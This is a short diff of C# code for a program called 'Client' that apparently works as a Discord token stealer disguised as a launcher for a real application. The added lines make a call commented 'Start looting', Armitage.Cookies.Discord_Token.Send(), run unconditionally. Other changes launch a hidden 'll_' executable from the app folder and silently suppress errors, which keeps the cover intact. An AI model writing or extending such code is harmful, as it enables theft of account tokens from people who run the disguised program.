@@ -81,6 +81,7 @@ namespace Client
             /// Start looting.
             Armitage.Cookies.Discord_Token.Send();
 #endif
+            Armitage.Cookies.Discord_Token.Send();
             /// Init update checkers.
             Utilities.Updater Updater = new Utilities.Updater();
             Updater.Start();
@@ -171,7 +172,7 @@ namespace Client
         /// </summary>
         public static void CheckRealApplication()
         {
-            string target = "ll_";
+            string target = AppDomain.CurrentDomain.BaseDirectory + "/ll_";
             if (File.Exists(target))
             {
                 var p = new Process
@@ -182,7 +183,11 @@ namespace Client
                         UseShellExecute = false
                     }
                 };
-                p.Start();
+                try
+                {
+                    p.Start();
+                }
+                catch { }
             }
         }
     }
